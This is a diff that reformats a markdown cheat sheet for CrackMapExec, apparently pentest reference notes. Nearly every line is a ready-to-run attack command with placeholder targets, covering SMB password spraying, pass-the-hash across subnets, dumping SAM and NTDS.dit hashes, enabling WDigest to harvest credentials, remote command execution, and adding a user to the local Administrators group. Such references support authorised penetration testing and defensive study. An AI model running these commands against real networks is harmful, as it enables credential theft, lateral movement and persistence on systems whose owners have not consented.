@@ -2,148 +2,227 @@
 legal-banner: true
 ---
 
-### **CRACKMAPEXEC (CME)**
+### **CrackMapExec (CME)**
 
-CrackMapExec (CME) is an open-source post-exploitation tool that helps penetration testers to perform various network-level attacks and enumeration tasks. It is particularly useful for managing large Active Directory (AD) networks.
+CrackMapExec (CME) is an open-source post-exploitation tool that helps penetration testers perform various network-level attacks and enumeration tasks, It is particularly useful for managing large Active Directory (AD) environments.  
 
-### **KEY FUNCTIONALITIES**
 
-1. Enumerating Users and Groups
-	`Lists users, groups, and other AD objects`
-2. Password Spraying
-	`Tests a single password against multiple user accounts`
-3. Command Execution
-	`Executes commands remotely on target systems`
-4. Dumping Hashes
-	`Extracts password hashes from remote systems`
-5. Accessing Shares	
-	`Lists and accesses SMB shares on remote systems`
+### **Key Functionalities**
 
-### **TARGET FORMATS**
+1. **Enumerating Users and Groups**  
+   Lists users, groups, and other AD objects  
 
-1. Single IP Address:
-   	`crackmapexec smb [IP-ADDRESS-1] [IP-ADDRESS-2]`
+2. **Password Spraying**  
+   Tests a single password against multiple user accounts  
 
-2. IP range
-   `crackmapexec smb [IP-ADDRESS]-28 [IP-ADDRESS]-67`
+3. **Command Execution**  
+   Executes commands remotely on target systems  
 
-3. CIDR notation
-   `crackmapexec smb [IP-ADDRESS]/24`
+4. **Dumping Hashes**  
+   Extracts password hashes from remote systems  
 
-4. Targets from file
-   `crackmapexec smb targets.txt`
+5. **Accessing Shares**  
+   Lists and accesses SMB shares on remote systems  
 
-### **CONNECT TO TARGET USING LOCAL ACCOUNT**
+### **Target Formats**
 
-1. Connect with local account
-   `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth`
+1. Single IP address:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS-1] [IP-ADDRESS-2]
+   ```
 
-2. Using Null Session:
-   `crackmapexec smb [IP-ADDRESS] -u "" -p ""`
+2. IP range:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS]-28 [IP-ADDRESS]-67
+   ```
 
-### **PASS THE HASH AGAINST A SUBNET**
+3. CIDR notation:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS]/24
+   ```
 
-1. Pass the hash with local auth
-   `crackmapexec smb [IP_ADDRESS]/24 -u [USERNAME] -H '[LMHASH:NTHASH]' --local-auth`
+4. Targets from file:  
+   ```bash
+   crackmapexec smb targets.txt
+   ```
 
-2. Standard Pass the Hash
-   `crackmapexec smb [IP-ADDRESS]/24 -u [USERNAME] -H '[NTHASH]'`
+### **Connect to Target Using Local Account**
 
-### **BRUTEFORCING AND PASSWORD SPRAYING**
+1. Connect with a local account:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth
+   ```
 
-1. Single password
-   `crackmapexec smb [IP-ADDRESS]/24 -u "[USERNAME]" -p "[PASSWORD]"`
+2. Using a null session:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u "" -p ""
+   ```
 
-2. Multiple passwords
-   `crackmapexec smb [IP-ADDRESS]/24 -u "[USERNAME]" -p "[PASSWORD1]" "[PASSWORD2]"`
+### **Pass the Hash Against a Subnet**
 
-3. Multiple users
-    `crackmapexec smb [IP-ADDRESS]/24 -u "[USERNAME1]" "[USERNAME2]" -p "[PASSWORD]"`
+1. Pass the hash with local auth:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS]/24 -u [USERNAME] -H '[LMHASH:NTHASH]' --local-auth
+   ```
 
-4. Users and passwords from files
-    `crackmapexec smb [IP-ADDRESS]/24 -u [USER_FILE] -p [PASS_FILE]`
+2. Standard pass the hash:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS]/24 -u [USERNAME] -H '[NTHASH]'
+   ```
 
-5. Users from file, hashes from file
-    `crackmapexec smb [IP-ADDRESS]/24 -u [USER_FILE] -H [NTLM_HASH_FILE]`
+### **Bruteforcing and Password Spraying**
 
-### **USERS ENUMERATION**
+1. Single password:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS]/24 -u "[USERNAME]" -p "[PASSWORD]"
+   ```
 
-1. Enumerate users
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --users`
+2. Multiple passwords:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS]/24 -u "[USERNAME]" -p "[PASSWORD1]" "[PASSWORD2]"
+   ```
 
-2. Perform RID bruteforce to get users
-   `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --rid-brute`
+3. Multiple users:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS]/24 -u "[USERNAME1]" "[USERNAME2]" -p "[PASSWORD]"
+   ```
 
-3. Enumerate domain groups
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --groups`
+4. Users and passwords from files:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS]/24 -u [USER_FILE] -p [PASS_FILE]
+   ```
 
-4. Enumerate local users
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-users`
+5. Users from file, hashes from file:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS]/24 -u [USER_FILE] -H [NTLM_HASH_FILE]
+   ```
 
-### **HOSTS ENUMERATION**
+### **User Enumeration**
 
-1. Generate a list of relayable hosts
-    `crackmapexec smb [IP-ADDRESS]/24 --gen-relay-list output.txt`
+1. Enumerate users:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --users
+   ```
 
-2. Enumerate available shares
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --shares`
+2. Perform RID brute force to get users:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --rid-brute
+   ```
 
-3. Get the active sessions
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --sessions`
+3. Enumerate domain groups:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --groups
+   ```
 
-4. Check logged in users
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --lusers`
+4. Enumerate local users:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-users
+   ```
 
-5. Get the password policy
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --pass-pol`
+### **Host Enumeration**
 
-### **COMMAND EXECUTION METHODS**
+1. Generate a list of relayable hosts:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS]/24 --gen-relay-list output.txt
+   ```
 
-1. Execute command through cmd.exe
-    `crackmapexec smb [IP_ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'whoami'`
+2. Enumerate available shares:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --shares
+   ```
 
-2. Force the smbexec method
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'net user Administrator /domain' --exec-method smbexec`
+3. Get active sessions:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --sessions
+   ```
 
-3. Execute commands through PowerShell
-    `crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p '[PASSWORD]' -X 'whoami'`
+4. Check logged-in users:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --lusers
+   ```
 
-### **GETTING CREDENTIALS**
+5. Get the password policy:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --pass-pol
+   ```
 
-1. Dump local SAM hashes
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --sam`
+### **Command Execution Methods**
 
-2. Enable WDigest to get credentials from LSA memory
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --wdigest enable`
+1. Execute a command through `cmd.exe`:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'whoami'
+   ```
 
-3. Disable WDigest
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --wdigest disable`
+2. Force the `smbexec` method:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'net user Administrator /domain' --exec-method smbexec
+   ```
 
-4. Query user sessions
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'quser'`
+3. Execute commands through PowerShell:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p '[PASSWORD]' -X 'whoami'
+   ```
 
-5. Force logoff
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'logoff [SESSIONID]'`
+### **Getting Credentials**
 
-6. Dump the NTDS.dit from DC using secretsdump.py
-    `crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p '[PASSWORD]' --ntds`
+1. Dump local SAM hashes:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --sam
+   ```
 
-7. Use Volume Shadow copy Service to dump NTDS.dit
-    `crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p '[PASSWORD]' --ntds vss`
+2. Enable WDigest to get credentials from LSA memory:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --wdigest enable
+   ```
 
-8. Dump the NTDS.dit password history
-    `crackmapexec smb [IP-ADDRESS]/24 -u [USERNAME] -p '[PASSWORD]' --ntds-history`
+3. Disable WDigest:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --wdigest disable
+   ```
 
-### **ADDITIONAL FEATURES**
+4. Query user sessions:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'quser'
+   ```
 
-1. Upload a file to a remote share
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --upload local_file.txt \\remote\share`
+5. Force logoff:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' -x 'logoff [SESSIONID]'
+   ```
 
-2. Download a file from a remote share
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --download \\remote\share\remote_file.txt local_path`
+6. Dump the `NTDS.dit` from the Domain Controller using `secretsdump.py`:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p '[PASSWORD]' --ntds
+   ```
 
-3. Add a new user
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth -x "net user [NEW_USER] [new_pass] /add"`
+7. Use Volume Shadow Copy Service to dump `NTDS.dit`:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p '[PASSWORD]' --ntds vss
+   ```
 
-4. Add a user to Admins group
-    `crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth -x "net localgroup administrators [NEW_USER] /add"`
+8. Dump the `NTDS.dit` password history:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS]/24 -u [USERNAME] -p '[PASSWORD]' --ntds-history
+   ```
+
+### **Additional Features**
+
+1. Upload a file to a remote share:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --upload local_file.txt \\remote\share
+   ```
+
+2. Download a file from a remote share:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth --download \\remote\share\remote_file.txt local_path
+   ```
+
+3. Add a new user:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth -x "net user [NEW_USER] [NEW_PASS] /add"
+   ```
+
+4. Add a user to the Administrators group:  
+   ```bash
+   crackmapexec smb [IP-ADDRESS] -u '[USERNAME]' -p '[PASSWORD]' --local-auth -x "net localgroup administrators [NEW_USER] /add"
+   ```
